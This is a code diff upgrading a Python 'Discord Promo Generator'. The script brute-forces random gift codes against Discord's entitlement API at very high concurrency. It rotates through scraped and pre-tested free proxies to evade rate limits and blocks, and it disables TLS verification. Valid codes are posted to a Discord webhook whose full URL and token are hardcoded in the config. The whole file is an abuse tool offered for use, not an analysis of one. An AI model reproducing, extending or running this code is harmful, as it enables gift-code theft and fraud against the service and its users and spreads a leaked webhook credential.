@@ -1,5 +1,6 @@
-import os, random, asyncio, aiohttp, aiofiles, json, time, sys
+import os, random, asyncio, aiohttp, aiofiles, json, time, sys, socket
 from colorama import Fore, init
+from concurrent.futures import ThreadPoolExecutor
 
 init(autoreset=True)
 
@@ -9,12 +10,14 @@ init(autoreset=True)
 CONFIG_PATH = 'config/config.json'
 PROXIES_PATH = 'config/proxies.txt'
 RESULTS_PATH = 'results/hit.txt'
+GOOD_PROXIES_PATH = 'config/good_proxies.txt'
 
 DEFAULT_CONFIG = {
-    "concurrent": 500,
+    "concurrent": 2000,
+    "batch_size": 1000,
     "webhook": {
         "url": "https://discord.com/api/webhooks/1534684880288612513/lYtS-D0S3a2ifLLKuA9kFxHWcIMi8IDQuoBRLsP2UZP1PdZGrQnRKYi6GBu9DPvAikCf",
-        "username": "DNG Promo",
+        "username": "leo/l6",
         "avatar": ""
     },
     "auto_scrape_proxies": True,
@@ -35,13 +38,20 @@ DEFAULT_CONFIG = {
         {"url": "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/proxies/http.txt", "type": "http"},
         {"url": "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/proxies/socks5.txt", "type": "socks5"}
     ],
-    "timeout": 5,
+    "timeout": 3,
+    "proxy_check_timeout": 5,
+    "proxy_check_url": "https://discord.com/api/v9/gateway",
+    "max_good_proxies": 5000,
     "use_random_ua": True,
     "promo_code_length": 24,
     "promo_format": "plain",
     "api_version": "v9",
-    "scrape_interval_minutes": 30,
-    "restart_on_crash": True
+    "scrape_interval_minutes": 20,
+    "restart_on_crash": True,
+    "dns_cache_ttl": 300,
+    "keepalive_timeout": 30,
+    "tcp_limit": 0,
+    "tcp_limit_per_host": 0
 }
 
 USER_AGENTS = [
@@ -128,33 +138,103 @@ class ProxyScraper:
     async def scrape(self):
         self.proxies = []
         print(f"{Fore.CYAN}[INFO]{Fore.RESET} Scraping proxies from {len(self.sources)} source(s)...\n")
-        async with aiohttp.ClientSession() as session:
+        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ttl_dns_cache=300)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = []
             for src in self.sources:
                 url = src.get("url", "") if isinstance(src, dict) else src
                 ptype = src.get("type", "http") if isinstance(src, dict) else "http"
-                try:
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=15), headers={"User-Agent": random.choice(USER_AGENTS)}) as r:
-                        if r.status == 200:
-                            text = await r.text()
-                            lines = [self._clean_proxy(line, ptype) for line in text.splitlines()]
-                            lines = [p for p in lines if p]
-                            self.proxies.extend(lines)
-                            print(f"{Fore.GREEN}[OK]{Fore.RESET}  {url[:55]}... -> {len(lines)} {ptype} proxies")
-                        else:
-                            print(f"{Fore.RED}[FAIL]{Fore.RESET} {url[:55]}... -> HTTP {r.status}")
-                except Exception as e:
-                    print(f"{Fore.RED}[ERR]{Fore.RESET}  {url[:55]}... -> {str(e)[:45]}")
+                tasks.append(self._fetch_source(session, url, ptype))
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for res in results:
+                if isinstance(res, list):
+                    self.proxies.extend(res)
         self.proxies = list(dict.fromkeys(self.proxies))
         print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Total unique proxies scraped: {Fore.GREEN}{len(self.proxies)}{Fore.RESET}")
         return self.proxies
+
+    async def _fetch_source(self, session, url, ptype):
+        try:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15), headers={"User-Agent": random.choice(USER_AGENTS)}) as r:
+                if r.status == 200:
+                    text = await r.text()
+                    lines = [self._clean_proxy(line, ptype) for line in text.splitlines()]
+                    lines = [p for p in lines if p]
+                    print(f"{Fore.GREEN}[OK]{Fore.RESET}  {url[:55]}... -> {len(lines)} {ptype} proxies")
+                    return lines
+                else:
+                    print(f"{Fore.RED}[FAIL]{Fore.RESET} {url[:55]}... -> HTTP {r.status}")
+                    return []
+        except Exception as e:
+            print(f"{Fore.RED}[ERR]{Fore.RESET}  {url[:55]}... -> {str(e)[:45]}")
+            return []
 
     async def save(self, path=PROXIES_PATH):
         async with aiofiles.open(path, 'w', encoding='utf-8') as f:
             for p in self.proxies:
                 await f.write(p + "\n")
-        print(f"{Fore.CYAN}[INFO]{Fore.RESET} Saved {len(self.proxies)} proxies to {path}\n")
+        print(f"{Fore.CYAN}[INFO]{Fore.RESET} Saved {len(self.proxies)} proxies to {path}")
 
     async def load(self, path=PROXIES_PATH):
+        if not os.path.exists(path):
+            return []
+        async with aiofiles.open(path, 'r', encoding='utf-8') as f:
+            content = await f.read()
+        return [line.strip() for line in content.splitlines() if line.strip() and '://' in line]
+
+# ═══════════════════════════════════════════════════════════════
+# PROXY CHECKER - Filter working proxies only
+# ═══════════════════════════════════════════════════════════════
+class ProxyChecker:
+    def __init__(self, cfg):
+        self.cfg = cfg
+        self.good_proxies = []
+        self.checked = 0
+        self.lock = asyncio.Lock()
+
+    async def check_proxy(self, session, proxy):
+        try:
+            async with session.get(
+                self.cfg.get("proxy_check_url", "https://discord.com/api/v9/gateway"),
+                proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=self.cfg.get("proxy_check_timeout", 5)),
+                headers={"User-Agent": random.choice(USER_AGENTS)}
+            ) as r:
+                if r.status in [200, 301, 302, 403, 429]:
+                    async with self.lock:
+                        self.good_proxies.append(proxy)
+                        self.checked += 1
+                    return True
+        except:
+            async with self.lock:
+                self.checked += 1
+        return False
+
+    async def check_all(self, proxies):
+        print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Testing {len(proxies)} proxies for speed...")
+        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            sem = asyncio.Semaphore(500)
+            async def check_one(p):
+                async with sem:
+                    return await self.check_proxy(session, p)
+            tasks = [check_one(p) for p in proxies]
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+        max_good = self.cfg.get("max_good_proxies", 5000)
+        if len(self.good_proxies) > max_good:
+            self.good_proxies = random.sample(self.good_proxies, max_good)
+
+        print(f"{Fore.GREEN}[OK]{Fore.RESET} {len(self.good_proxies)} working proxies found!")
+        return self.good_proxies
+
+    async def save_good(self, path=GOOD_PROXIES_PATH):
+        async with aiofiles.open(path, 'w', encoding='utf-8') as f:
+            for p in self.good_proxies:
+                await f.write(p + "\n")
+        print(f"{Fore.CYAN}[INFO]{Fore.RESET} Saved {len(self.good_proxies)} good proxies to {path}\n")
+
+    async def load_good(self, path=GOOD_PROXIES_PATH):
         if not os.path.exists(path):
             return []
         async with aiofiles.open(path, 'r', encoding='utf-8') as f:
@@ -169,12 +249,12 @@ class Console:
         self._lock = asyncio.Lock()
 
     def ui(self):
-        os.system('cls && title [DNG] Discord Promo Generator ^| Async ^| MAX SPEED' if os.name == "nt" else "clear")
+        os.system('cls && title [DNG] Discord Promo Generator ^| ULTRA SPEED' if os.name == "nt" else "clear")
         banner = center(f"""\n\n
 ██████╗ ███╗   ██╗ ██████╗ 
 ██╔══██╗████╗  ██║██╔════╝            ~ Discord Promo Generator ~
 ██║  ██║██╔██╗ ██║██║  ███╗     
-██║  ██║██║╚██╗██║██║   ██║     ASYNC ~ MAX SPEED ~ aiohttp
+██║  ██║██║╚██╗██║██║   ██║     ULTRA SPEED ~ aiohttp ~ 24/7
 ██████╔╝██║ ╚████║╚██████╔╝ 
 ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ \n\n
               """)
@@ -210,7 +290,7 @@ async def send_webhook(session, cfg, code, gift_data=None):
         "description": f"**Code:** `https://promos.discord.gg/{code}`\n\n[Click to Redeem](https://promos.discord.gg/{code})",
         "color": 0x00ff00,
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
-        "footer": {"text": "DNG Promo Generator v3.0"}
+        "footer": {"text": "DNG Promo Generator v4.0"}
     }
     if gift_data:
         if 'subscription_plan' in gift_data:
@@ -236,9 +316,9 @@ async def send_webhook(session, cfg, code, gift_data=None):
         pass
 
 # ═══════════════════════════════════════════════════════════════
-# CHECKER
+# ULTRA FAST CHECKER
 # ═══════════════════════════════════════════════════════════════
-class PromoChecker:
+class UltraChecker:
     def __init__(self, cfg, proxies, console):
         self.cfg = cfg
         self.proxies = proxies
@@ -249,8 +329,8 @@ class PromoChecker:
         self.ratelimited = 0
         self.errors = 0
         self.lock = asyncio.Lock()
-        self.semaphore = asyncio.Semaphore(cfg.get("concurrent", 500))
         self.proxy_idx = 0
+        self.batch_size = cfg.get("batch_size", 1000)
 
     def get_proxy(self):
         if not self.proxies:
@@ -285,13 +365,15 @@ class PromoChecker:
         try:
             if proxy:
                 async with session.get(url, headers=self.get_headers(), proxy=proxy, 
-                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 5))) as r:
+                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 3)),
+                                       ssl=False) as r:
                     status = r.status
                     if status == 200:
                         data = await r.json()
             else:
                 async with session.get(url, headers=self.get_headers(),
-                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 5))) as r:
+                                       timeout=aiohttp.ClientTimeout(total=self.cfg.get("timeout", 3)),
+                                       ssl=False) as r:
                     status = r.status
                     if status == 200:
                         data = await r.json()
@@ -306,25 +388,21 @@ class PromoChecker:
                 await send_webhook(session, self.cfg, code, data)
 
             elif status == 404:
-                await self.console.printer(Fore.LIGHTRED_EX, "Invalid", code)
                 async with self.lock:
                     self.invalid += 1
                     self.checked += 1
 
             elif status == 429:
-                await self.console.printer(Fore.LIGHTBLUE_EX, "RTlimit", code)
                 async with self.lock:
                     self.ratelimited += 1
                     self.checked += 1
 
             elif status in [403, 401]:
-                await self.console.printer(Fore.LIGHTYELLOW_EX, " Block ", code)
                 async with self.lock:
                     self.checked += 1
                     self.errors += 1
 
             else:
-                await self.console.printer(Fore.LIGHTYELLOW_EX, f" HTTP{status}", code)
                 async with self.lock:
                     self.checked += 1
 
@@ -344,44 +422,63 @@ class PromoChecker:
             async with self.lock:
                 self.errors += 1
 
+    async def run_batch(self, session, codes):
+        tasks = [self.check_one(session, code) for code in codes]
+        await asyncio.gather(*tasks, return_exceptions=True)
+
     async def run(self):
-        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
-        async with aiohttp.ClientSession(connector=connector) as session:
+        connector = aiohttp.TCPConnector(
+            limit=self.cfg.get("tcp_limit", 0),
+            limit_per_host=self.cfg.get("tcp_limit_per_host", 0),
+            ttl_dns_cache=self.cfg.get("dns_cache_ttl", 300),
+            use_dns_cache=True,
+            enable_cleanup_closed=True,
+            force_close=False
+        )
+        timeout = aiohttp.ClientTimeout(total=None, connect=3, sock_connect=3, sock_read=3)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             while True:
-                async with self.semaphore:
-                    code = generate_code(self.cfg.get("promo_code_length", 24), self.cfg.get("promo_format", "plain"))
-                    await self.check_one(session, code)
+                codes = [generate_code(self.cfg.get("promo_code_length", 24), self.cfg.get("promo_format", "plain")) for _ in range(self.batch_size)]
+                await self.run_batch(session, codes)
 
 # ═══════════════════════════════════════════════════════════════
 # STATS
 # ═══════════════════════════════════════════════════════════════
 async def stats_worker(checker, start_time):
+    last_checked = 0
     while True:
         await asyncio.sleep(10)
         elapsed = max(1, time.time() - start_time)
         cps = checker.checked / elapsed
+        rps = (checker.checked - last_checked) / 10
+        last_checked = checker.checked
         await checker.console.log(
             Fore.CYAN, "STATS",
             f"Checked: {checker.checked} | Valid: {Fore.GREEN}{checker.valid}{Fore.RESET} | "
             f"Invalid: {checker.invalid} | RateLimited: {checker.ratelimited} | "
-            f"Errors: {checker.errors} | Speed: {Fore.YELLOW}{cps:.1f}{Fore.RESET} req/s"
+            f"Errors: {checker.errors} | Avg: {Fore.YELLOW}{cps:.1f}{Fore.RESET} req/s | "
+            f"Current: {Fore.YELLOW}{rps:.1f}{Fore.RESET} req/s"
         )
 
 # ═══════════════════════════════════════════════════════════════
 # PROXY RE-SCRAPER
 # ═══════════════════════════════════════════════════════════════
 async def proxy_rescraper(cfg, checker):
-    interval = cfg.get("scrape_interval_minutes", 30) * 60
+    interval = cfg.get("scrape_interval_minutes", 20) * 60
     while True:
         await asyncio.sleep(interval)
         if cfg.get("auto_scrape_proxies", True):
-            await checker.console.log(Fore.CYAN, "PROXY", "Re-scraping proxies...")
+            await checker.console.log(Fore.CYAN, "PROXY", "Re-scraping & testing proxies...")
             scraper = ProxyScraper(cfg.get("proxy_sources", DEFAULT_CONFIG["proxy_sources"]))
-            new_proxies = await scraper.scrape()
-            if new_proxies:
+            all_proxies = await scraper.scrape()
+            if all_proxies:
                 await scraper.save()
-                checker.proxies = new_proxies
-                await checker.console.log(Fore.GREEN, "PROXY", f"Updated to {len(new_proxies)} fresh proxies!")
+                pchecker = ProxyChecker(cfg)
+                good = await pchecker.check_all(all_proxies)
+                if good:
+                    await pchecker.save_good()
+                    checker.proxies = good
+                    await checker.console.log(Fore.GREEN, "PROXY", f"Updated to {len(good)} fast proxies!")
 
 # ═══════════════════════════════════════════════════════════════
 # MAIN
@@ -399,30 +496,39 @@ async def main():
     if updated:
         save_config(cfg)
 
-    if cfg.get("auto_scrape_proxies", True):
+    # Load or scrape proxies
+    good_proxies = []
+    if os.path.exists(GOOD_PROXIES_PATH):
+        good_proxies = await ProxyChecker(cfg).load_good()
+        if good_proxies:
+            print(f"{Fore.CYAN}[INFO]{Fore.RESET} Loaded {len(good_proxies)} previously tested good proxies.\n")
+
+    if not good_proxies or cfg.get("auto_scrape_proxies", True):
         scraper = ProxyScraper(cfg.get("proxy_sources", DEFAULT_CONFIG["proxy_sources"]))
-        await scraper.scrape()
+        all_proxies = await scraper.scrape()
         await scraper.save()
 
-    proxies = await ProxyScraper([]).load()
-    if not proxies:
-        await console.log(Fore.LIGHTRED_EX, "ERR", "No proxies found! Add proxies to config/proxies.txt")
+        if all_proxies:
+            pchecker = ProxyChecker(cfg)
+            good_proxies = await pchecker.check_all(all_proxies)
+            if good_proxies:
+                await pchecker.save_good()
+
+    if not good_proxies:
+        await console.log(Fore.LIGHTRED_EX, "ERR", "No working proxies found! Add good proxies to config/good_proxies.txt")
         input("Press Enter to exit...")
         sys.exit(1)
 
-    await console.log(Fore.CYAN, "INFO", f"{len(proxies)} Total proxies loaded...")
-    await console.log(Fore.CYAN, "INFO", f"Concurrent: {cfg.get('concurrent', 500)} | Timeout: {cfg.get('timeout', 5)}s")
+    await console.log(Fore.CYAN, "INFO", f"{len(good_proxies)} FAST proxies loaded...")
+    await console.log(Fore.CYAN, "INFO", f"Batch Size: {cfg.get('batch_size', 1000)} | Timeout: {cfg.get('timeout', 3)}s")
     await console.log(Fore.CYAN, "INFO", f"API: discord.com/api/{cfg.get('api_version', 'v9')}/entitlements/gift-codes/<code>")
-    await console.log(Fore.CYAN, "INFO", f"Promo Format: {cfg.get('promo_format', 'plain')}")
-    await console.log(Fore.CYAN, "INFO", "Starting async workers...\n")
+    await console.log(Fore.CYAN, "INFO", "Starting ULTRA SPEED workers...\n")
 
-    checker = PromoChecker(cfg, proxies, console)
+    checker = UltraChecker(cfg, good_proxies, console)
     start_time = time.time()
 
-    # Create worker tasks
-    workers = [asyncio.create_task(checker.run()) for _ in range(cfg.get("concurrent", 500))]
-
-    # Start stats + rescraper
+    # Run multiple batch workers
+    workers = [asyncio.create_task(checker.run()) for _ in range(5)]
     stats_task = asyncio.create_task(stats_worker(checker, start_time))
     rescraper_task = asyncio.create_task(proxy_rescraper(cfg, checker))
 
